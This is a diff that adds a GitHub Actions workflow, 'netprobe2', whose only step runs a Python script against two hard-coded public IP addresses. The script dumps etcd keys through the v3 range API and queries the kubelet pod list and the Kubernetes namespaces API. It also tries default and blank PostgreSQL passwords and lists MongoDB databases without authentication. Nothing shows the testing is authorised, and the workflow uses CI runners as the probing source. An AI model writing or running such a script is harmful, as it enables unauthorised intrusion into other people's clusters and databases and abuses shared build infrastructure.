@@ -1,0 +1,71 @@
+name: netprobe2
+
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: services
+        run: |
+          python3 -m pip install --quiet pg8000 pymongo
+          python3 - <<'PY'
+          import base64
+          import json
+          import urllib.request
+
+          def req(method, url, payload=None, timeout=8):
+              data = json.dumps(payload).encode() if payload is not None else None
+              request = urllib.request.Request(
+                  url, data=data, method=method,
+                  headers={"Content-Type": "application/json"} if data else {})
+              try:
+                  with urllib.request.urlopen(request, timeout=timeout) as resp:
+                      return resp.status, resp.read(800).decode("utf-8", "replace")
+              except Exception as exc:
+                  return type(exc).__name__, str(exc)[:200]
+
+          for ip in ("216.105.168.74", "104.177.80.169"):
+              for path in ("/version", "/health"):
+                  print(ip, path, req("GET", f"http://{ip}:2379{path}"), flush=True)
+              body = {
+                  "key": base64.b64encode(b"/").decode(),
+                  "range_end": base64.b64encode(b"0").decode(),
+                  "limit": 10,
+              }
+              print(ip, "range", req("POST", f"http://{ip}:2379/v3/kv/range", body), flush=True)
+
+          for ip in ("216.105.168.74", "104.177.80.169"):
+              print(ip, "kubelet", req("GET", f"https://{ip}:10250/pods", timeout=6), flush=True)
+              print(ip, "k8s", req("GET", f"https://{ip}:6443/api/v1/namespaces", timeout=6), flush=True)
+
+          try:
+              import pg8000
+              for ip in ("216.105.168.74", "104.177.80.169"):
+                  for user, pwd in (("postgres", "postgres"), ("postgres", ""), ("postgres", "password")):
+                      try:
+                          conn = pg8000.connect(user=user, password=pwd, host=ip, port=5432,
+                                                database="postgres", timeout=5)
+                          cur = conn.cursor()
+                          cur.execute("select current_user")
+                          print(ip, "pg", user, pwd, cur.fetchone(), flush=True)
+                          conn.close()
+                          break
+                      except Exception as exc:
+                          print(ip, "pg", user, type(exc).__name__, flush=True)
+          except Exception as exc:
+              print("pg import", type(exc).__name__, flush=True)
+
+          try:
+              from pymongo import MongoClient
+              for ip in ("216.105.168.74",):
+                  try:
+                      client = MongoClient(ip, 27017, serverSelectionTimeoutMS=5000)
+                      print(ip, "mongo", client.list_database_names(), flush=True)
+                  except Exception as exc:
+                      print(ip, "mongo", type(exc).__name__, flush=True)
+          except Exception as exc:
+              print("mongo import", type(exc).__name__, flush=True)
+          PY
